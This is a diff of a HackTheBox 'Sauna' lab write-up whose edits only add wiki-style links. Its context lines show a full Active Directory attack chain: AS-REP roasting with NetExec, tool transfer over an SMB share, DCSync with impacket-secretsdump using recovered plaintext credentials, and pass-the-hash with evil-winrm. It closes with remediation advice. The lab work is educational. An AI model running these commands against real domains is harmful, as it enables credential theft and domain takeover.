@@ -1,5 +1,5 @@
 
-# HTB: Sauna – Write-up
+# [[HTB]]: Sauna – Write-up
 
 ## 1. Initial Port Scan
 
@@ -207,7 +207,7 @@ result: 0 Success
 
 ## 5. DNS Enumeration (Port 53)
 
-Attempted zone transfers against both `sauna.htb` and the base domain:
+Attempted zone transfers against both `sauna.[[htb]]` and the base domain:
 
 ```bash
 ╰─ dig axfr @10.10.10.175 sauna.htb
@@ -312,7 +312,7 @@ Stopped: Wed Jul 30 17:14:49 2025
 
 ## 8. Initial Access via Evil-WinRM
 
-Used the cracked credentials to authenticate via `evil-winrm`:
+Used the cracked credentials to authenticate via `evil-[[winrm]]`:
 
 ```bash
 ╭─ ~/htb/sauna ▓▒░──────────────────────────────────────────────────────────────────────────────────────────░▒▓ ✔  12:09:59 PM  
@@ -457,7 +457,7 @@ Administrator:500:aad3b435b51404eeaad3b435b51404eeaad3b435b51404ee:823452073d75b
 
 ## 12. Pass-the-Hash & Root Flag
 
-Used the harvested administrator hash to authenticate via `evil-winrm` using pass-the-hash:
+Used the harvested administrator hash to authenticate via `evil-[[winrm]]` using pass-the-hash:
 
 ```bash
 ╭─ ~/htb/sauna ▓▒░──────────────────────────────────────────────────────────────────────────────────░▒▓ 127 ✘  05:32:03 PM 
@@ -911,9 +911,9 @@ result: 0 Success
 ```
 
 	- Using The NetExec (nxc) LDAP client to perform an AS-REP roasting attack against the domain controller at 10.10.10.175 as user fsmith (with no password) and saves the resulting AS-REP hashes to fsmith-asrep.txt.
-			`nxc ldap 10.10.10.175 -u fsmith -p '' --asreproast fsmith-asrep.txt
+			`nxc [[ldap]] 10.10.10.175 -u fsmith -p '' --asreproast fsmith-asrep.txt
 		- nxc – the NetExec CLI binary
-		- ldap – tells NetExec you’re targeting the LDAP service on the DC
+		- [[ldap]] – tells NetExec you’re targeting the [[LDAP]] service on the DC
 		- 10.10.10.175 – the IP of the domain controller
 		- -u fsmith – username flag (we’re impersonating fsmith)
 		- -p '' – password flag (empty string, since ASREProast abuses accounts without valid passwords)
@@ -1024,12 +1024,12 @@ fsmith-asrep.txt  sauna_services.gnmap  SaunaServicesVersions.txt  sauna_winpeas
 	- Downloading WinPEAS from kali attack machine to Windows target machine
 	- on kali vm for window machine to connect to and pull down winpeas
 	- On Kali attack machine set up smb share 
-		 `╭─ ~/htb/sauna ▓▒░─────────────────────────────────────░▒▓ INT ✘  11m 58s  02:28:02 PM  
+		 `╭─ ~/[[htb]]/sauna ▓▒░─────────────────────────────────────░▒▓ INT ✘  11m 58s  02:28:02 PM  
 		 `╰─ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -username df -password df share . -smb2support`
-	- On Windows connect to the kali smb share and cd into share
+	- On [[Windows]] connect to the [[kali]] [[smb]] share and cd into share
 		`\\10.10.14.16\share> net use \\10.10.14.16\share df /user:df`
 		`cd \\10.10.14.16\share\`
-	 - Running WinPEAS to enumerate the Windows machine
+	 - Running [[WinPEAS]] to enumerate the [[Windows]] machine
 		 - reveals autologon creds svc_loanmanager / Moneymakestheworldgoround!
 	 - Running net user reveals a user by the name svc_loanmgr
 	 ```bash
@@ -1056,17 +1056,17 @@ fsmith-asrep.txt  sauna_services.gnmap  SaunaServicesVersions.txt  sauna_winpeas
 	- running WinPEAS on svc_loanmgr reveals nothing
 
 	- copying SharpHound.exe from install location to /htb/sauna
-		- `cp /usr/share/sharphound/SharpHound.exe /htb/sauna
+		- `cp /usr/share/sharphound/SharpHound.exe /[[htb]]/sauna
 
-	- pull Sharphound from kali smb share to windows 
+	- pull Sharphound from [[kali]] [[smb]] share to [[windows]] 
 		- `*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\10.10.14.16\share> .\SharpHound.exe`
 
-	- upload zip from sharphound output to bloodhound
+	- upload zip from sharphound output to [[bloodhound]]
 
-	-  identified connection from svc_loanmgr has DCSync permissions with connect to domain admin
+	-  identified connection from svc_loanmgr has [[DCSync]] permissions with connect to domain admin
 	- ![[Pasted image 20250801174912.png]]
 
-	- Can perform a dcsync attack with impacket-secrets dump 
+	- Can perform a [[dcsync]] attack with [[impacket]]-secrets dump 
 ```bash
 ╭─ ~/htb/sauna ▓▒░────────────────────────────────────────────────────────────░▒▓ ✔  1m 1s  04:40:01 PM                    
 ╰─ impacket-secretsdump 'egotistical-bank.local'/'svc_loanmgr':'Moneymakestheworldgoround!'@'10.10.10.175'                   
@@ -1371,7 +1371,7 @@ Administrator:500:...:823452073d75b9d1cf70ebdf86c7f98e:::
     
 3. Retrieved AS-REP hash for `fsmith` and cracked it with `hashcat`.
     
-4. Logged in using `evil-winrm` with recovered credentials.
+4. Logged in using `evil-[[winrm]]` with recovered credentials.
     
 
 ```bash
@@ -1540,13 +1540,13 @@ Port/Service Discovery → Web Enumeration → Username Harvesting → Kerberos 
 
 ### Remediation Recommendations
 
-1. **Enforce Kerberos preauthentication** on all accounts to prevent AS-REP roasting.
+1. **Enforce [[Kerberos]] preauthentication** on all accounts to prevent [[AS-REP roasting]].
     
 2. **Remove plaintext AutoLogon credentials**; use secure secret storage or eliminate AutoLogon entirely.
     
-3. **Audit and restrict replication/DCSync rights**; ensure service accounts follow least privilege.
+3. **Audit and restrict replication/[[DCSync]] rights**; ensure service accounts follow least privilege.
     
-4. **Monitor anomalous replication/authentication behavior** (e.g., unusual DCSync/AS-REP requests).
+4. **Monitor anomalous replication/authentication behavior** (e.g., unusual [[DCSync]]/AS-REP requests).
     
 5. **Segment domain admin activities** and protect high-privilege credentials with multi-factor and tiered administration.
     
